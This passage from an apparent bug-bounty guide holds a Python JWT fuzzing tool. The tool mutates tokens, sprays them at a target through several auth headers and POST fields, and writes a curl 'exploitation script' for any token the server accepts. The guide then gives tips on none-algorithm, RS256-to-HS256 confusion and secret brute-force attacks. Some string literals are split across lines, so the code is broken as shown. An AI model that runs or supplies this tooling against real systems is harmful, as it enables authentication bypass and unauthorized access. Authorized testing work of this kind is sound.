            variations.append((f'special_{char}', f"{parts[0]}{char}.{parts[1]}.{parts[2]}"))
    
    return variations

def test_jwt_variation(variation_name, jwt_token, target_url):
    """Test a JWT variation against target"""
    headers_to_test = [
        {'Authorization': f'Bearer {jwt_token}'},
        {'Authorization': f'JWT {jwt_token}'},
        {'X-Access-Token': jwt_token},
        {'X-Auth-Token': jwt_token},
        {'X-JWT-Token': jwt_token}
    ]
    
    data_to_test = [
        {'token': jwt_token},
        {'jwt': jwt_token},
        {'access_token': jwt_token},
        {'auth_token': jwt_token}
    ]
    
    results = []
    
    # Test with headers
    for headers in headers_to_test:
        try:
            response = requests.get(target_url, headers=headers, timeout=5)
            results.append({
                'variation': variation_name,
                'method': 'header',
                'header': list(headers.keys())[0],
                'status_code': response.status_code,
                'response_length': len(response.text),
                'response_time': response.elapsed.total_seconds()
            })
        except Exception as e:
            results.append({
                'variation': variation_name,
                'method': 'header',
                'header': list(headers.keys())[0],
                'error': str(e)
            })
    
    # Test with POST data
    for data in data_to_test:
        try:
            response = requests.post(target_url, data=data, timeout=5)
            results.append({
                'variation': variation_name,
                'method': 'post_data',
                'data_key': list(data.keys())[0],
                'status_code': response.status_code,
                'response_length': len(response.text),
                'response_time': response.elapsed.total_seconds()
            })
        except Exception as e:
            results.append({
                'variation': variation_name,
                'method': 'post_data',
                'data_key': list(data.keys())[0],
                'error': str(e)
            })
    
    return results

# Main fuzzing execution
if len(sys.argv) < 3:
    print("Usage: python3 script.py <jwt_token> <target_url>")
    sys.exit(1)

token = sys.argv[1]
target_url = sys.argv[2]

print("🎯 Starting JWT fuzzing...")

# Generate variations
variations = fuzz_jwt_structure(token)
print(f"📊 Generated {len(variations)} JWT variations")

# Test variations with threading
all_results = []
successful_variations = []

with ThreadPoolExecutor(max_workers=10) as executor:
    future_to_variation = {
        executor.submit(test_jwt_variation, var_name, var_token, target_url): (var_name, var_token)
        for var_name, var_token in variations
    }
    
    for future in as_completed(future_to_variation):
        var_name, var_token = future_to_variation[future]
        try:
            results = future.result()
            all_results.extend(results)
            
            # Check for interesting responses
            for result in results:
                if 'status_code' in result:
                    if result['status_code'] == 200:
                        successful_variations.append((var_name, var_token, result))
                        print(f"✅ SUCCESS: {var_name} - {result['method']} - Status: {result['status_code']}")
                    elif result['status_code'] in [401, 403]:
                        print(f"🔒 AUTH: {var_name} - {result['method']} - Status: {result['status_code']}")
                    elif result['status_code'] == 500:
                        print(f"💥 ERROR: {var_name} - {result['method']} - Status: {result['status_code']}")
        
        except Exception as e:
            print(f"❌ ERROR testing {var_name}: {str(e)}")
        
        time.sleep(0.1)  # Rate limiting

# Save results
with open('jwt_fuzzing_results.json', 'w') as f:
    json.dump(all_results, f, indent=2)

# Generate summary
print(f"
📊 Fuzzing Summary:")
print(f"Total variations tested: {len(variations)}")
print(f"Successful responses (200): {len(successful_variations)}")
print(f"Total requests made: {len(all_results)}")

if successful_variations:
    print(f"
✅ Successful Variations:")
    for var_name, var_token, result in successful_variations:
        print(f"  - {var_name}: {result['method']} method")

# Generate exploitation script for successful variations
if successful_variations:
    with open('exploit_successful_jwts.sh', 'w') as f:
        f.write("#!/bin/bash
")
        f.write("# JWT Exploitation Script for Successful Variations
")
        f.write("TARGET_URL=$1

")
        
        for i, (var_name, var_token, result) in enumerate(successful_variations):
            f.write(f"echo "Testing {var_name}..."
")
            if result['method'] == 'header':
                f.write(f"curl -H "{result['header']}: {var_token}" "$TARGET_URL"
")
            else:
                f.write(f"curl -d "{result['data_key']}={var_token}" "$TARGET_URL"
")
            f.write("echo "---"

")
    
    import os
    os.chmod('exploit_successful_jwts.sh', 0o755)
    print("🚀 Exploitation script generated: exploit_successful_jwts.sh")

print("💾 Detailed results saved to jwt_fuzzing_results.json")
EOF
```

---

## 🎯 Bounty Maximization Strategy

1. **Chain JWT vulnerabilities**: JWT bypass + Privilege escalation = $3000+
2. **Focus on algorithm confusion**: None algorithm bypass = High severity
3. **Test secret brute force**: Weak secrets are common = Easy wins
4. **Document thoroughly**: Show before/after tokens, demonstrate impact
5. **Test responsibly**: Don't abuse admin access, just prove concept

---

## 🚨 Legal Disclaimer

This guide is for authorized penetration testing and bug bounty programs only. Always ensure you have proper authorization before testing any systems. Unauthorized access to computer systems is illegal.

---

**Elite Hacker Tip**: JWT algorithm confusion attacks are goldmines! Always test 'none' algorithm and RS256->HS256 confusion. Many developers don't validate algorithms properly! 🔥
